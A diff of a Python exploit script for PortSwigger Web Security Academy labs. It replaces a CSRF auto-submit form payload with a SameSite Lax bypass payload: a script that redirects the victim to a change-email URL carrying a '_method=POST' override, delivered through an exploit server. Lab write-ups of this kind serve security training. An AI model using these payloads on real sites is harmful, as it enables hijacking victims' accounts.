@@ -1,17 +1,17 @@
-###################################################################################
+##################################################################################################
 #
 # Author: Ahmed Elqalawy (@elqal3awii)
 #
-# Date: 21/10/2023
+# Date: 24/10/2023
 #
-# Lab: CSRF where token validation depends on token being present
+# Lab: SameSite Lax bypass via method override
 #
-# Steps: 1. Craft an HTML form for changing the email address with an auto-submit 
-#           script and doesn't include the csrf token in the form
+# Steps: 1. Make the request to change the email using the GET method and include an 
+#           additional URL parameter to override the method
 #        2. Deliver the exploit to the victim
 #        3. The victim's email will be changed after they trigger the exploit
 #
-###################################################################################
+##################################################################################################
 
 
 ###########
@@ -25,10 +25,10 @@ from colorama import Fore
 #########
 
 # change this to your lab URL
-lab_url = "https://0a7e00e704abf9118540a8a2007c003d.web-security-academy.net"
+lab_url = "https://0a8200d4032acdb180d24992007e007e.web-security-academy.net"
 
 # change this to your exploit server URL
-exploit_server_url = "https://exploit-0a2b00dc04c6f92e85afa7cf01db0064.exploit-server.net"
+exploit_server_url = "https://exploit-0a3a006c0346cd62807c483d01580013.exploit-server.net"
 
 # the header of your exploit sever response
 exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
@@ -38,17 +38,9 @@ exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8
 new_email = "hacked@you.com"
 
 # payload to change the victim's email
-payload = f"""<html>
-                <body>
-                <form action="{lab_url}/my-account/change-email" method="POST">
-                    <input type="hidden" name="email" value="{new_email}" />
-                    <input type="submit" value="Submit request" />
-                </form>
-                <script>
-                    document.forms[0].submit();
-                </script>
-                </body>
-            </html> """
+payload = f"""<script>
+                location = "{lab_url}/my-account/change-email?email={new_email}&_method=POST"
+            </script>"""
 
 # data to send via POST
 data = {
